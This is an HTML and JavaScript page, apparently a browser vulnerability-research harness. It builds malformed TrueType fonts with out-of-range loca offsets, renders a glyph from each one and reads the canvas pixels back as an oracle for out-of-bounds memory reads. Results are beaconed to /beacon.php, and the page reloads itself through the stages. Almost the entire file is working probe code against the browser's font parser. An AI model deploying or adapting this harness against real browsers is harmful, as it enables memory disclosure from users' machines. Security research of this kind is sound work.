<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1182v2 Font Loca OOB Pixel Oracle</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
#phase{font-size:16px;color:#00ffee}
#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
</style>
</head><body>
<div id="hud">
  <h1>P1182v2 — FONT LOCA OOB PIXEL ORACLE (valid 7-table TTF)</h1>
  <div id="status">BOOTING...</div>
  <div id="phase">phase: init</div>
  <div id="counters">stage: ?</div>
  <div id="finds">no findings yet</div>
</div>
<div id="log"></div>
<script>
'use strict';
var L=document.getElementById('log'),S=document.getElementById('status'),
PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
var T0=Date.now();
function setStatus(t){S.textContent=t;}
function setPhase(t){PH.textContent='phase: '+t;}
function setCounters(t){CT.textContent=t;}
function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
function log(m,c){var d=document.createElement('div');d.className=c||'';
d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
function B(tag,data){try{var u='/beacon.php?tag=P1182-'+encodeURIComponent(tag);
if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
u+='&t='+Date.now();new Image().src=u;}catch(e){}}
window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};

/* build a structurally-correct minimal TTF (7 tables: head maxp cmap hhea
   hmtx loca glyf) with an attacker-controlled loca offset for glyph 1 */
function buildTTF(locaOff1){
  /* size: header 12 + dir 7*16 + tables */
  var headL=54, maxpL=32, hheaL=36, hmtxL=8, locaL=12, glyfL=44, cmapL=262+12;
  var total=12+7*16+headL+maxpL+hheaL+hmtxL+locaL+glyfL+cmapL;
  var buf=new ArrayBuffer(total);
  var dv=new DataView(buf);
  var i=0;
  /* offset table */
  dv.setUint32(i,0x00010000,false);i+=4;
  dv.setUint16(i,7,false);i+=2;
  dv.setUint16(i,0,false);i+=2; /* searchRange (garbage ok) */
  dv.setUint16(i,0,false);i+=2;
  dv.setUint16(i,0,false);i+=2;
  var dir=i;
  i+=7*16;
  var headOff=i;
  /* head (54) */
  dv.setUint32(i,0x00010000,false);i+=4;
  dv.setUint32(i,0x00010000,false);i+=4;
  dv.setUint32(i,0,false);i+=4;
  dv.setUint32(i,0x5F0F3CF5,false);i+=4;
  dv.setUint16(i,0x000B,false);i+=2;
  dv.setUint16(i,1000,false);i+=2;
  for(var k=0;k<16;k++){dv.setUint8(i,0);i++;}
  dv.setUint16(i,0,false);i+=2; dv.setUint16(i,0,false);i+=2;
  dv.setUint16(i,512,false);i+=2; dv.setUint16(i,512,false);i+=2;
  dv.setUint16(i,0,false);i+=2;
  dv.setUint16(i,8,false);i+=2;
  dv.setUint16(i,2,false);i+=2;
  dv.setUint16(i,1,false);i+=2;   /* indexToLocFormat = 1 (LONG) */
  dv.setUint16(i,0,false);i+=2;
  var maxpOff=i;
  /* maxp (32) */
  dv.setUint32(i,0x00010000,false);i+=4;
  dv.setUint16(i,2,false);i+=2;    /* numGlyphs=2 */
  for(var m=0;m<13;m++){dv.setUint16(i,0,false);i+=2;}
  var hheaOff=i;
  /* hhea (36) */
  dv.setUint32(i,0x00010000,false);i+=4;
  dv.setUint16(i,800,false);i+=2;  /* ascender */
  dv.setUint16(i,-200&0xFFFF,false);i+=2; /* descender */
  dv.setUint16(i,0,false);i+=2;    /* lineGap */
  dv.setUint16(i,512,false);i+=2;  /* advanceWidthMax */
  dv.setUint16(i,0,false);i+=2; dv.setUint16(i,0,false);i+=2;
  dv.setUint16(i,512,false);i+=2;
  dv.setUint16(i,1,false);i+=2; dv.setUint16(i,0,false);i+=2;
  dv.setUint16(i,0,false);i+=2;
  for(var h=0;h<8;h++){dv.setUint8(i,0);i++;}
  dv.setUint16(i,0,false);i+=2;
  dv.setUint16(i,2,false);i+=2;    /* numberOfHMetrics=2 */
  var hmtxOff=i;
  /* hmtx (8): 2 x {advance, lsb} */
  dv.setUint16(i,0,false);i+=2; dv.setUint16(i,0,false);i+=2;
  dv.setUint16(i,512,false);i+=2; dv.setUint16(i,0,false);i+=2;
  var locaOff=i;
  /* loca (12): 3 x uint32 */
  dv.setUint32(i,0,false);i+=4;
  dv.setUint32(i,locaOff1>>>0,false);i+=4;
  dv.setUint32(i,(locaOff1+12)>>>0,false);i+=4;
  var glyfOff=i;
  /* glyf (40) */
  /* glyph0 empty: 10 bytes */
  dv.setUint16(i,0,false);i+=2;
  dv.setUint16(i,0,false);i+=2;dv.setUint16(i,0,false);i+=2;
  dv.setUint16(i,0,false);i+=2;dv.setUint16(i,0,false);i+=2;
  /* glyph1 simple: 1 contour, 4 points (~30 bytes) */
  dv.setUint16(i,1,false);i+=2;
  dv.setUint16(i,0,false);i+=2;dv.setUint16(i,0,false);i+=2;
  dv.setUint16(i,512,false);i+=2;dv.setUint16(i,512,false);i+=2;
  dv.setUint16(i,3,false);i+=2;    /* endPts[0]=3 */
  dv.setUint16(i,0,false);i+=2;    /* instructionLength */
  for(var p=0;p<4;p++){dv.setUint8(i,0x21);i++;} /* on-curve flags */
  for(var p2=0;p2<4;p2++){dv.setUint16(i,p2*128,false);i+=2;} /* x */
  for(var p3=0;p3<4;p3++){dv.setUint16(i,p3*128,false);i+=2;} /* y */
  var cmapOff=i;
  /* cmap (12 + 262): format 0 */
  dv.setUint16(i,0,false);i+=2;
  dv.setUint16(i,1,false);i+=2;
  dv.setUint16(i,0,false);i+=2;    /* platform 0 */
  dv.setUint16(i,3,false);i+=2;    /* encoding 3 */
  dv.setUint32(i,12,false);i+=4;
  dv.setUint16(i,0,false);i+=2;    /* format 0 */
  dv.setUint16(i,262,false);i+=2;
  dv.setUint16(i,0,false);i+=2;
  for(var c=0;c<256;c++){
    dv.setUint8(i,(c===65)?1:0);i++;  /* 'A' -> glyph 1 */
  }
  /* directory records */
  var tables=[
    ['head',headOff,headL],['maxp',maxpOff,maxpL],['hhea',hheaOff,hheaL],
    ['hmtx',hmtxOff,hmtxL],['loca',locaOff,locaL],['glyf',glyfOff,glyfL],
    ['cmap',cmapOff,cmapL]
  ];
  for(var t=0;t<7;t++){
    var rec=dir+t*16;
    for(var c2=0;c2<4;c2++)dv.setUint8(rec+c2,tables[t][0].charCodeAt(c2));
    dv.setUint32(rec+4,0,false);
    dv.setUint32(rec+8,tables[t][1],false);
    dv.setUint32(rec+12,tables[t][2],false);
  }
  return buf;
}

function runVariant(kind){
  var offs={ctl:0,past1:500,past2:700,past3:900,far:2000,wrap:0xFFFFF000};
  var buf=buildTTF(offs[kind]);
  return new Promise(function(res){
    try{
      var ff=new FontFace('loca'+Date.now()%1000,buf,{});
      document.fonts.add(ff);
      ff.load().then(function(){
        B('LOADED',kind);
        var cv=document.createElement('canvas');cv.width=200;cv.height=100;
        var cx=cv.getContext('2d');
        cx.fillStyle='#ffffff';
        try{cx.font='40px "'+ff.family+'"';}catch(e){cx.font='40px serif';}
        try{cx.fillText('A',10,60);}catch(e){B('FILL-ERR',kind+':'+String(e.message).slice(0,30));}
        var pix=cx.getImageData(0,0,200,100);
        var nz=0,sample=[];
        for(var i2=0;i2<pix.data.length;i2+=4){
          var r=pix.data[i2],g=pix.data[i2+1],b=pix.data[i2+2];
          if(r||g||b){nz++;if(sample.length<8)sample.push((i2/4)+':'+r+','+g+','+b);}
        }
        res({kind:kind,nz:nz,sample:sample.join(' ')});
      },function(e){res({kind:kind,rej:'NetworkError'});});
    }catch(e){res({kind:kind,thr:String(e).slice(0,50)});}
  });
}

var STAGES=['ctl','past1','past2','past3','far','wrap'];
var stage=0,results=[];
try{stage=parseInt(localStorage.getItem('p1182_stage')||'0');}catch(e){}
try{var r=localStorage.getItem('p1182_res');if(r)results=JSON.parse(r);}catch(e){}
if(!Array.isArray(results))results=[];
B('BOOT','stage='+stage+'|'+STAGES[stage]);
setStatus('STAGE '+stage+'/5 — '+STAGES[stage]);

if(stage>=STAGES.length){
  setStatus('ALL DONE');
  B('ALL-DONE',JSON.stringify(results).slice(0,800));
  log('=== ALL DONE ===','ok');
  try{localStorage.removeItem('p1182_stage');}catch(e){}
}else{
  try{localStorage.setItem('p1182_stage',''+(stage+1));}catch(e){}
  var cur=STAGES[stage];
  setPhase('loca variant '+cur);
  runVariant(cur).then(function(rr){
    var rep=JSON.stringify(rr);
    results.push({stage:stage,name:cur,result:rep});
    try{localStorage.setItem('p1182_res',JSON.stringify(results));}catch(e){}
    B('RESULT',rep.slice(0,700));
    addFind(cur+': '+rep.slice(0,300));
    setStatus(rep.slice(0,80));
    log('=== '+cur+' -> '+rep+' ===','ok');
    B('NEXT');
    setTimeout(function(){location.reload(true);},700);
  });
}

/* auto-reload checker */
(function(){
  var cur='P1182-loca-oracle';
  setTimeout(function check(){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/reload.txt?c='+Date.now(),true);
      x.onload=function(){
        var t=(x.responseText||'').trim();
        if(t&&t!==cur){location.reload(true);return;}
        setTimeout(check,3000);};
      x.onerror=function(){setTimeout(check,5000);};
      x.send();
    }catch(e){setTimeout(check,5000);}
  },4000);
})();
</script>
</body></html>
